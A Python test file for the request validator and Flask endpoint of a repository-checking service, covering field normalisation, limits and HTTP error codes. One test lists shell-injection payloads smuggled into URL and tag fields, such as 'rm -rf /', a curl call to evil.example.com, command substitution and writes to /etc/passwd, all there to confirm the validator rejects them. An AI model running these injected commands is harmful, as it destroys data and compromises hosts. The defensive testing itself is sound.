#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tests for the /opencheck request body validation.

The tests are split in two layers:

* ``openchecker.request_validator`` is exercised directly. It only depends on
  the standard library, so these cases run even without a message broker;
* the endpoint is driven through the Flask test client to make sure a rejected
  body becomes HTTP 400 with an ``error`` field, that an accepted body is
  published with the normalized fields plus a task id, and that a publication
  the broker rejects becomes HTTP 500.

Run with: python -m pytest test/test_request_validation.py -q
"""

import json
import os
import sys
import unittest
from unittest.mock import patch

sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
# main.py is started as a script (see the Dockerfile) and imports its siblings
# (helper, logger, ...) as top level modules; adding the package directory
# keeps `from openchecker.main import app` importable from the test runner too.
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'openchecker'))

from openchecker.request_validator import (
    SUPPORTED_COMMANDS,
    RequestValidationError,
    validate_opencheck_payload,
)


def valid_payload(**overrides):
    """Return a minimal valid /opencheck body with ``overrides`` applied."""
    payload = {
        'commands': ['url-checker'],
        'project_url': 'https://github.com/Laniakea2012/openchecker',
        'callback_url': 'https://callback.example.com/opencheck',
        'task_metadata': {'version_number': 'v1.0.0'},
    }
    payload.update(overrides)
    return payload


class ValidationTestCase(unittest.TestCase):
    """Common assertions for the validator tests."""

    def assert_rejected(self, payload, fragment):
        with self.assertRaises(RequestValidationError) as context:
            validate_opencheck_payload(payload)
        self.assertTrue(
            any(fragment in error for error in context.exception.errors),
            'expected %r in %r' % (fragment, context.exception.errors),
        )


class TestValidPayload(ValidationTestCase):
    """A well formed body is returned normalized, with the defaults filled in."""

    def test_returns_normalized_fields(self):
        result = validate_opencheck_payload(valid_payload())

        self.assertEqual(result['commands'], ['url-checker'])
        self.assertEqual(result['project_url'], 'https://github.com/Laniakea2012/openchecker')
        self.assertEqual(result['callback_url'], 'https://callback.example.com/opencheck')
        self.assertEqual(result['task_metadata'], {'version_number': 'v1.0.0'})

    def test_optional_fields_default_to_none_and_empty_metadata(self):
        result = validate_opencheck_payload({
            'commands': ['url-checker'],
            'project_url': 'https://github.com/a/b',
            'callback_url': 'https://example.com/callback',
        })

        self.assertIsNone(result['commit_hash'])
        self.assertIsNone(result['access_token'])
        self.assertEqual(result['task_metadata'], {})

    def test_surrounding_whitespace_is_removed(self):
        result = validate_opencheck_payload(valid_payload(
            commands=['  url-checker  '],
            project_url='  https://github.com/a/b  ',
            callback_url='\thttps://example.com/callback\n',
            commit_hash='  abcdef1  ',
            access_token='  token-value  ',
            task_metadata={'version_number': ' v2.0.0 '},
        ))

        self.assertEqual(result['commands'], ['url-checker'])
        self.assertEqual(result['project_url'], 'https://github.com/a/b')
        self.assertEqual(result['callback_url'], 'https://example.com/callback')
        self.assertEqual(result['commit_hash'], 'abcdef1')
        self.assertEqual(result['access_token'], 'token-value')
        self.assertEqual(result['task_metadata'], {'version_number': 'v2.0.0'})

    def test_duplicate_commands_are_removed_in_order(self):
        result = validate_opencheck_payload(valid_payload(
            commands=['osv-scanner', 'url-checker', 'osv-scanner'],
        ))

        self.assertEqual(result['commands'], ['osv-scanner', 'url-checker'])

    def test_empty_optional_values_are_treated_as_missing(self):
        result = validate_opencheck_payload(valid_payload(
            commit_hash='',
            access_token='   ',
            task_metadata={'version_number': ''},
        ))

        self.assertIsNone(result['commit_hash'])
        self.assertIsNone(result['access_token'])
        self.assertEqual(result['task_metadata'], {})

    def test_unknown_fields_are_ignored(self):
        result = validate_opencheck_payload(valid_payload(debug=True, extra='ignored'))

        self.assertEqual(
            sorted(result.keys()),
            ['access_token', 'callback_url', 'commands', 'commit_hash',
             'project_url', 'task_metadata'],
        )

    def test_every_supported_command_is_accepted(self):
        commands = sorted(SUPPORTED_COMMANDS)

        result = validate_opencheck_payload(valid_payload(commands=commands))

        self.assertEqual(result['commands'], commands)

    def test_urls_with_query_and_user_information_are_accepted(self):
        for url in ('https://github.com/a/b?ref=main#readme',
                    'https://oauth2:token@gitlab.com/a/b.git'):
            with self.subTest(url=url):
                result = validate_opencheck_payload(valid_payload(project_url=url))
                self.assertEqual(result['project_url'], url)


class TestBodyShape(ValidationTestCase):
    """The body itself has to be a JSON object."""

    def test_missing_body_is_rejected(self):
        with self.assertRaises(RequestValidationError) as context:
            validate_opencheck_payload(None)

        self.assertIn('commands', str(context.exception))

    def test_non_object_bodies_are_rejected(self):
        for body in ([], 'commands=url-checker', 42, True):
            with self.subTest(body=body):
                with self.assertRaises(RequestValidationError) as context:
                    validate_opencheck_payload(body)
                self.assertEqual(len(context.exception.errors), 1)


class TestCommands(ValidationTestCase):
    """Checks on the ``commands`` field."""

    def test_missing_commands(self):
        payload = valid_payload()
        del payload['commands']

        self.assert_rejected(payload, "'commands' is required")

    def test_commands_must_be_an_array(self):
        self.assert_rejected(valid_payload(commands='url-checker'), "'commands' must be an array")

    def test_commands_must_not_be_empty(self):
        self.assert_rejected(valid_payload(commands=[]), 'at least one checker name')

    def test_command_entries_must_be_strings(self):
        self.assert_rejected(valid_payload(commands=['url-checker', 3]), "'commands[1]' must be a string")

    def test_blank_command_is_rejected(self):
        self.assert_rejected(valid_payload(commands=['   ']), "'commands[0]' must not be empty")

    def test_unknown_command_is_rejected(self):
        self.assert_rejected(valid_payload(commands=['osv-scaner']), 'not a supported checker')

    def test_internal_shell_scripts_are_not_valid_commands(self):
        for name in ('download-checkout', 'generate-lock_files', 'remove-source-code'):
            with self.subTest(command=name):
                self.assert_rejected(valid_payload(commands=[name]), 'not a supported checker')

    def test_too_many_commands_are_rejected(self):
        self.assert_rejected(valid_payload(commands=['url-checker'] * 51), 'more than 50')

    def test_overlong_command_is_rejected(self):
        self.assert_rejected(valid_payload(commands=['u' * 65]), 'longer than 64')


class TestUrls(ValidationTestCase):
    """``project_url`` and ``callback_url`` have to be safe http(s) URLs."""

    def test_both_http_and_https_are_accepted(self):
        for scheme in ('http', 'https'):
            with self.subTest(scheme=scheme):
                url = '%s://github.com/a/b' % scheme
                result = validate_opencheck_payload(valid_payload(project_url=url))
                self.assertEqual(result['project_url'], url)

    def test_other_schemes_are_rejected(self):
        for url in ('ftp://github.com/a/b', 'file:///etc/passwd',
                    'git://github.com/a/b', 'github.com/a/b'):
            with self.subTest(url=url):
                self.assert_rejected(valid_payload(project_url=url), 'scheme')

    def test_url_without_host_is_rejected(self):
        for url in ('https://', 'https:///path', 'https:/github.com'):
            with self.subTest(url=url):
                self.assert_rejected(valid_payload(project_url=url), 'host name')

    def test_missing_project_url_is_rejected(self):
        payload = valid_payload()
        del payload['project_url']

        self.assert_rejected(payload, "'project_url' is required")

    def test_missing_callback_url_is_rejected(self):
        payload = valid_payload()
        del payload['callback_url']

        self.assert_rejected(payload, "'callback_url' is required")

    def test_non_string_url_is_rejected(self):
        self.assert_rejected(valid_payload(project_url=12), "'project_url' must be a string URL")

    def test_empty_url_is_rejected(self):
        self.assert_rejected(valid_payload(project_url='   '), "'project_url' must not be empty")

    def test_url_length_limit(self):
        accepted = 'https://github.com/' + 'a' * 2029
        self.assertEqual(len(accepted), 2048)

        result = validate_opencheck_payload(valid_payload(project_url=accepted))
        self.assertEqual(result['project_url'], accepted)

        self.assert_rejected(valid_payload(project_url=accepted + 'a'), 'longer than 2048')

    def test_shell_injection_in_url_is_rejected(self):
        # constans.py interpolates project_url into `git clone <url>` without
        # quoting, so every one of these payloads used to reach the shell.
        injections = [
            'https://github.com/a/b; rm -rf /',
            'https://github.com/a/b && curl http://evil.example.com',
            'https://github.com/a/b | tee /etc/cron.d/x',
            'https://github.com/a/b`whoami`',
            'https://github.com/a/b$(whoami)',
            'https://github.com/a/b"$(id)"',
            "https://github.com/a/b'",
            'https://github.com/a/b\ncurl http://evil.example.com',
            'https://github.com/a/b > /etc/passwd',
        ]
        for url in injections:
            with self.subTest(url=url):
                self.assert_rejected(valid_payload(project_url=url), 'shell metacharacters')
                self.assert_rejected(valid_payload(callback_url=url), 'shell metacharacters')


class TestOptionalFields(ValidationTestCase):
    """``commit_hash``, ``access_token`` and ``task_metadata`` are optional but checked."""

    def test_commit_hash_must_be_hexadecimal(self):
        self.assert_rejected(valid_payload(commit_hash='zzzz'), 'hexadecimal')
        self.assert_rejected(valid_payload(commit_hash='abc'), 'hexadecimal')

    def test_commit_hash_must_be_a_string(self):
        self.assert_rejected(valid_payload(commit_hash=123), "'commit_hash' must be a string")

    def test_short_commit_hash_is_accepted(self):
        result = validate_opencheck_payload(valid_payload(commit_hash='a1b2c3d'))

        self.assertEqual(result['commit_hash'], 'a1b2c3d')

    def test_access_token_must_be_a_string_without_whitespace(self):
        self.assert_rejected(valid_payload(access_token=123), "'access_token' must be a string")
        self.assert_rejected(valid_payload(access_token='tok en'), 'whitespace or control')
        self.assert_rejected(valid_payload(access_token='tok\nen'), 'whitespace or control')

    def test_access_token_length_limit(self):
        self.assert_rejected(valid_payload(access_token='t' * 513), 'longer than 512')

    def test_task_metadata_must_be_an_object(self):
        self.assert_rejected(valid_payload(task_metadata='metadata'), "'task_metadata' must be a JSON object")
        self.assert_rejected(valid_payload(task_metadata=['a']), "'task_metadata' must be a JSON object")

    def test_task_metadata_size_limit(self):
        self.assert_rejected(valid_payload(task_metadata={'blob': 'x' * 5000}), 'larger than 4096')

    def test_task_metadata_depth_limit(self):
        self.assert_rejected(valid_payload(task_metadata={'a': {'b': {'c': {'d': 1}}}}), 'deeper than 3')

    def test_version_number_must_be_a_safe_tag_name(self):
        self.assert_rejected(valid_payload(task_metadata={'version_number': 1.0}), 'must be a string')
        self.assert_rejected(
            valid_payload(task_metadata={'version_number': 'v1.0.0; rm -rf /'}),
            'tag or branch name',
        )
        self.assert_rejected(
            valid_payload(task_metadata={'version_number': 'v' * 129}),
            'tag or branch name',
        )

    def test_regular_metadata_and_release_tags_are_kept(self):
        self.assertEqual(
            validate_opencheck_payload(valid_payload(task_metadata={'team': 'x'}))['task_metadata'],
            {'team': 'x'},
        )
        self.assertEqual(
            validate_opencheck_payload(
                valid_payload(task_metadata={'version_number': 'dev-1.2_build+3'})
            )['task_metadata'],
            {'version_number': 'dev-1.2_build+3'},
        )


try:
    from openchecker.main import app, create_access_token
except ImportError as import_error:  # pragma: no cover - depends on the environment
    app = None
    create_access_token = None
    IMPORT_ERROR = str(import_error)
else:
    IMPORT_ERROR = ''


@unittest.skipIf(app is None, 'Flask app dependencies unavailable: %s' % IMPORT_ERROR)
class TestOpenCheckEndpoint(unittest.TestCase):
    """The endpoint maps validation results to HTTP responses and messages."""

    def setUp(self):
        self.app = app
        self.app.config['TESTING'] = True
        self.client = self.app.test_client()
        # A real token is signed instead of stubbing the decorator, so the
        # authentication code path of the application is part of the test.
        with self.app.app_context():
            token = create_access_token(identity='test_user')
        self.headers = {
            'Authorization': 'Bearer %s' % token,
            'Content-Type': 'application/json',
        }

    def post_opencheck(self, body, headers=None):
        return self.client.post('/opencheck', data=json.dumps(body),
                                headers=headers or self.headers)

    @patch('openchecker.main.publish_message')
    def test_valid_request_is_published_with_task_id(self, mock_publish):
        mock_publish.return_value = True

        response = self.post_opencheck(valid_payload())

        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data)
        self.assertIn('message', data)
        self.assertEqual(len(data['task_id']), 32)

        payload = valid_payload()
        mock_publish.assert_called_once()
        _, queue_name, body = mock_publish.call_args[0]
        self.assertEqual(queue_name, 'opencheck')
        published = json.loads(body)
        self.assertEqual(published['task_id'], data['task_id'])
        self.assertEqual(published['command_list'], ['url-checker'])
        self.assertEqual(published['project_url'], payload['project_url'])
        self.assertEqual(published['callback_url'], payload['callback_url'])
        self.assertEqual(published['task_metadata'], payload['task_metadata'])
        self.assertIsNone(published['commit_hash'])
        self.assertIsNone(published['access_token'])

    @patch('openchecker.main.publish_message')
    def test_missing_required_field_is_rejected(self, mock_publish):
        response = self.post_opencheck({'commands': ['url-checker']})

        self.assertEqual(response.status_code, 400)
        data = json.loads(response.data)
        self.assertIn('error', data)
        self.assertTrue(any('project_url' in detail for detail in data['details']))
        mock_publish.assert_not_called()

    @patch('openchecker.main.publish_message')
    def test_unknown_command_is_rejected(self, mock_publish):
        response = self.post_opencheck(valid_payload(commands=['url-checker', 'osv-scaner']))

        self.assertEqual(response.status_code, 400)
        self.assertIn('not a supported checker', response.data.decode())
        mock_publish.assert_not_called()

    @patch('openchecker.main.publish_message')
    def test_shell_injection_in_project_url_is_rejected(self, mock_publish):
        response = self.post_opencheck(valid_payload(
            project_url='https://github.com/a/b; rm -rf /',
        ))

        self.assertEqual(response.status_code, 400)
        self.assertIn('shell metacharacters', response.data.decode())
        mock_publish.assert_not_called()

    @patch('openchecker.main.publish_message')
    def test_non_json_body_is_rejected(self, mock_publish):
        response = self.client.post('/opencheck', data='commands=url-checker', headers=self.headers)

        self.assertEqual(response.status_code, 400)
        self.assertIn('error', json.loads(response.data))
        mock_publish.assert_not_called()

    @patch('openchecker.main.publish_message')
    def test_json_array_body_is_rejected(self, mock_publish):
        response = self.post_opencheck(['url-checker'])

        self.assertEqual(response.status_code, 400)
        mock_publish.assert_not_called()

    def test_request_without_token_is_rejected(self):
        response = self.client.post(
            '/opencheck',
            data=json.dumps(valid_payload()),
            headers={'Content-Type': 'application/json'},
        )

        self.assertIn(response.status_code, [401, 422])

    @patch('openchecker.main.publish_message')
    def test_publish_failure_is_reported_as_server_error(self, mock_publish):
        mock_publish.return_value = False

        response = self.post_opencheck(valid_payload())

        self.assertEqual(response.status_code, 500)
        self.assertIn('error', json.loads(response.data))
        mock_publish.assert_called_once()


if __name__ == '__main__':
    unittest.main()
